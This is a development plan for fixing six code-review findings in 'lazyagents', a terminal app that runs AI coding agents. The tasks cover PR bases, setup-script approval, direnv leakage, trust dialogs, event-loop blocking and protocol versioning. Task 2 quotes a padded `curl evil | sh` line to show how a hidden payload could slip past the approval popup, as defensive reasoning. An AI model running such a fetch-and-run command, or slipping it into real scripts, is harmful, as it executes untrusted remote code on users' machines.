# Review fixes plan

Fixes the six "fix first" findings from the 2026-10-17 whole-app review. No separate spec:
each task states its own required behaviour.

## Global constraints

- Work in this worktree (`/Users/adrian/git/lazyagents-review-fixes`, branch
  `fix/review-findings`). Tooling comes from the nix dev shell: prefix commands with
  `nix develop -c`.
- Follow AGENTS.md: test first (watch the test fail for the expected reason, then
  implement); one Conventional Commit per logical change (load the `committing` skill);
  a change to the protocol, keybindings, configuration or status detection updates its
  doc in `docs/` in the same commit; a choice between real alternatives gets an ADR
  (`recording-decisions` skill), and an ADR a change overtakes gets an "Amended by"
  note.
- Comments: default to none; never narrate a change.
- Done for a task means `nix develop -c just check` is green and you read its output
  (about 3–4 minutes; run it with a 10-minute timeout). Anything visible in the TUI also
  gets a harness run (skill: running-dev).
- Safety: never run `just install`. Never touch `~/.local/state/lazyagents`. Every
  manual run sets `LAZYAGENTS_STATE_DIR` to a temp dir and shuts its daemon down. Never
  kill processes by name or pattern (`pkill`, `killall`): the user's real daemon and the
  agents in it, including the controller of this work, run the same binary name.
- The wire protocol will be bumped once, in Task 6, covering every wire change on this
  branch. Tasks 1–5 may change protocol types without touching `PROTOCOL_VERSION`, but
  must update `docs/protocol.md` for any change they make.

## Task 1: Open the finish menu's pull request against the worktree's base

`crates/tui/src/app.rs` (the `FinishChoice::PullRequest` arm, around line 2955) runs
`git push -u origin <branch> && gh pr create --fill --head <branch>`. It omits the base,
so `gh` targets the repository's default branch, while the menu's merge entry, ADR 0013
and `docs/keybindings.md` describe finishing against the worktree's base
(`WorktreeInfo::base`).

Required behaviour:
- When the base names a branch, the command passes `--base <base>` (shell-quoted with
  `commands::shell_quote`, like the branch).
- When the base is a commit rather than a branch (find out how `base` is recorded for a
  worktree started from a commit, e.g. a detached HEAD or an explicit sha, in
  `crates/daemon/src/git.rs` / `server.rs`), omit `--base`, so `gh` falls back to the
  default branch.
- Tests in the existing `app.rs` test module cover both cases by asserting on the
  `Effect::RunInTerminal` script.
- Update `docs/keybindings.md` / ADR 0013 only if their wording needs it.

## Task 2: Show the whole setup script before it can be approved

ADR 0014 promises that nothing from a repository runs without the user reading it
first. The approval popup (`crates/tui/src/ui.rs`, `Popup::ApproveSetup` in
`popup_content` around line 1005; drawn by `draw_popup` as a plain `Paragraph` clipped
by `centered`) can hide part of the script: a long line is cut at the popup's right
edge, so `npm install<200 spaces>; curl evil | sh` shows only `npm install`. A script
taller than the screen loses its bottom lines and the y/s/n hint, yet `y` still
approves.

Required behaviour:
- Every character of the script is visible: long lines wrap within the popup rather
  than being cut.
- Control characters in the script (anything `char::is_control` other than the line
  breaks the script is split on, e.g. `\r`, `\t`, ESC) are shown in a visible escaped
  form rather than passed to the terminal.
- When the script does not fit the screen, the popup scrolls (j/k or arrows, and
  page keys) and shows that more lines exist above or below. Approving (`y`, and the
  "remember" key `s`, whatever keys the popup binds for approval) is refused until the
  last line of the script has been shown, with a hint saying to scroll to the end;
  deny still works at any time.
- Keep the key hint visible at every size the popup is drawn at.
- Tests: model tests in `app.rs` for the approval gating and scrolling; render tests in
  `ui.rs` (TestBackend) proving a long line's tail is on screen, control characters are
  escaped, and a tall script shows a "more" marker. Harness-check the popup at 60x20 and
  120x40 with a script that has a long line and 40 lines.
- Update `docs/keybindings.md` for the popup's scroll keys, and add an "Amended by" or
  consequence note to ADR 0014 only if the approval rule needs restating.

## Task 3: Keep the daemon-starting shell's direnv environment out of agents

The daemon inherits the environment of whichever process first started it
(`crates/client/src/lib.rs`, `spawn_daemon`), which strips only terminal and Claude Code
variables. Agents spawned by the daemon inherit that environment
(`crates/daemon/src/spawn.rs`); agents whose directory has an `.envrc` run through
`direnv exec`. So if the first `lazyagents` invocation ran in a shell where direnv had
loaded project A's `.envrc`, every agent of project B (which has no `.envrc`) gets A's
exported variables (PATH entries, `DATABASE_URL`, cloud credentials) until the daemon
exits.

Required behaviour:
- Agents never see variables that a direnv-loaded `.envrc` of the daemon-starting shell
  added or changed; those variables are reverted to what they were before direnv loaded
  them (direnv records this in `DIRENV_DIFF`, with `DIRENV_DIR`, `DIRENV_FILE`,
  `DIRENV_WATCHES` alongside). Agents in a project with its own `.envrc` still get that
  project's environment as today.
- Choose the mechanism after checking how direnv actually behaves (for example whether
  `direnv exec` of a directory with no `.envrc`, or a direnv subcommand, reverts the
  current diff; or decoding `DIRENV_DIFF` yourself, which is zlib-compressed,
  base64url-encoded JSON with `p` = previous and `n` = next variables). Prefer no new
  dependency if a sound option exists; if you add one, justify it. Record the choice in
  an ADR, since there are real alternatives.
- If direnv is not installed or `DIRENV_DIFF` is absent or unreadable, behave as today
  (no revert) without failing to start the daemon or the agent.
- Tests: an automated test that starts the daemon from an environment carrying a direnv
  diff (generate one with the real direnv in a temp dir with an isolated HOME/XDG, as
  the existing direnv tests do, or construct a valid `DIRENV_DIFF` value) and asserts an
  agent in a project without `.envrc` does not see the added variable and does see the
  reverted original value. Follow the patterns in `crates/client/tests/client.rs` or
  `crates/daemon/tests/server.rs`.
- Update `docs/architecture.md` where it describes the daemon's or agents' environment.

## Task 4: Make approve choose "Yes, I trust this folder" on Claude's trust dialog

`y` (Action::Approve, `crates/tui/src/app.rs` around line 1990) presses `enter` on the
selected agent; ADR 0011 relies on Claude highlighting yes by default. Claude Code's
workspace-trust dialog (detected by `awaits_trust` in `crates/daemon/src/status.rs`,
which sets `Status::NeedsInput` with `waiting_for = "trusting this folder"` in
`crates/daemon/src/server.rs` around line 1224) highlights "No, exit" in current Claude
versions:

```
 Quick safety check: Is this a project you created or one you trust?

 ❯ No, exit
   Yes, I trust this folder

 Enter to confirm
```

So `y` exits Claude (`exited (1)`) and the agent's first prompt is lost. Every new
worktree Claude agent shows this dialog.

Required behaviour:
- Approving a Claude agent that shows the trust dialog selects "Yes, I trust this
  folder" and confirms it, whichever option the cursor is on and whichever order the
  two options are listed in. Deny on the trust dialog keeps today's behaviour.
- Approving any other agent behaves exactly as today.
- Avoid a new string contract between crates (matching `waiting_for` display text in
  the TUI is not acceptable). The daemon owns the screen and already detects the
  dialog, so prefer the daemon deciding which keys answer it — for example a request
  that means "approve this agent" which the daemon turns into the right keystrokes
  (enter for an ordinary prompt; arrow keys to reach the trust option, then enter, for
  the trust dialog, worked out from which row carries the `❯` cursor). Pick the
  design; if it changes the protocol, update `docs/protocol.md`. Also use it from the
  CLI if the CLI has an approve path (check `crates/lazyagents/src/commands.rs`).
- Amend ADR 0011 (an "Amended by"/consequence note, or a new ADR if the mechanism
  changes materially) and update `docs/status-detection.md` / `docs/keybindings.md`
  where they describe approving.
- Tests: unit tests for picking the keys from screen text (cursor on No, cursor on Yes,
  options in either order, wrapped lines like the existing `awaits_trust` fixtures);
  a daemon or TUI test proving the approve path sends them. A harness run is optional
  (a real `claude` would be needed); a fake agent script that prints the dialog and
  records what it receives is acceptable if cheap.

## Task 5: Keep slow work off the daemon's event loop

The daemon runs one event loop (`crates/daemon/src/server.rs`). These run inline in
`handle_request` / `handle_command` and block it:
- `stop()` (around line 850; called by kill, restart, remove and shutdown paths): runs
  `ps -A` through `reap::terminate` (~0.3 s), waits up to about 1 s of grace and up to
  2 s for a pending snapshot.
- `create_agent` (around line 614–770): `git worktree add` (runs the user's checkout
  hooks), `copy_worktree_includes` (two `git ls-files --others --ignored
  --exclude-standard` passes over every ignored file; 3.9 s on a repo with a large
  `target/`), file copies and direnv calls.
- Agent removal with its worktree (`git status`, `git worktree remove`).

While the loop is blocked every pane freezes, and new connections wait for their
`Welcome` (sent from the loop in `add_client`, around line 131). `lazyagents hook`
gives up after 200 ms (`crates/lazyagents/src/hook.rs:12`), so a hook arriving during a
kill or a worktree create is dropped; a dropped `PermissionRequest`/`Notification`
means the agent never shows needs-input. `Client::connect` also has a 2 s greeting
timeout, so a CLI command during a long create starts a redundant daemon and fails.

Required behaviour:
- A new connection receives `Welcome` without waiting for the event loop (for example
  send it from the per-connection task), so hooks never wait on slow work.
- Stopping agents, creating agents (worktree add, include copies, direnv) and removing
  agents' worktrees run off the loop, replying when done, following the existing
  pattern `git_query` and `merge_agent` use (`Reply::Deferred` or whatever it is
  called). Agent state stays consistent while such work is in flight: decide and test
  what happens to concurrent requests on the same agent (e.g. kill then remove, restart
  twice, remove during create, shutdown during create) — refuse with a clear error,
  queue, or coalesce, but never corrupt state, leak a process, or leave a half-made
  worktree. Name reservation for a create in flight must prevent two creates with the
  same name.
- Shutdown still stops every agent before the daemon exits.
- `copy_worktree_includes` lists ignored files only under the paths named in
  `.worktreeinclude` (pathspecs or `git check-ignore --stdin`), not the whole tree.
- Tests (in `crates/daemon/tests/server.rs`, following its helpers): a hook connection
  (or any new client) gets `Welcome` and its hook is applied while a slow create is in
  progress — make the create slow deterministically, e.g. a `post-checkout` hook in the
  test repo that blocks on a fifo or sleeps; panes keep streaming during it; the
  concurrent-request cases you chose; existing tests stay green. A unit or integration
  test that `copy_worktree_includes` no longer depends on unrelated ignored trees.
- Update `docs/architecture.md` (it claims `ps` never blocks the loop; state the rule
  "nothing slow runs on the event loop") and `docs/protocol.md` if replies change.

## Task 6: Bump the protocol and pin the wire format to its version

`PROTOCOL_VERSION` (`crates/protocol/src/lib.rs:21`) stayed at 5 while four commits
(7704bdd, b434d41, fa39828, 1bdec66) changed the postcard encoding, and this branch
changes it further. postcard is not self-describing and encodes enum variants by index,
so a TUI or hook from one build and a daemon from another can pass the version check
and decode each other's messages as different requests (at 8ee18f6, today's
`Request::Hook` index was `Shutdown`). Round-trip tests cannot catch this because both
sides use the same code.

Required behaviour:
- Bump `PROTOCOL_VERSION` to 6.
- Add a golden-bytes test in `crates/protocol` that encodes a fixed, representative
  sample of messages — every `Request` variant, every `ServerMessage`/`Response`
  variant, and an `AgentInfo` with every optional field populated (including `usage`
  and `worktree`) — and compares the bytes against a checked-in expectation that is
  tied to `PROTOCOL_VERSION` (for example a fixture file named after the version, or an
  assertion that fails with a message telling the reader to bump the version and
  regenerate). Any wire change must fail the test until the expectation is regenerated,
  and regenerating it without bumping the version must also fail (e.g. store the
  version alongside the bytes, or name the fixture by version and have regeneration
  refuse to overwrite the fixture of a version that already has one). Make
  regeneration a one-command step (an env var such as `UPDATE_GOLDEN=1` or an ignored
  test) and document it in the test.
- The sample must make adding a new enum variant without updating the sample fail too
  (e.g. an exhaustive `match` in the sample builder that has no wildcard arm).
- Add the rule to AGENTS.md (Working rules) and `docs/protocol.md`: any change to the
  encoded bytes of a message bumps `PROTOCOL_VERSION`, and the golden test enforces it.
- Update `docs/protocol.md`'s version number.
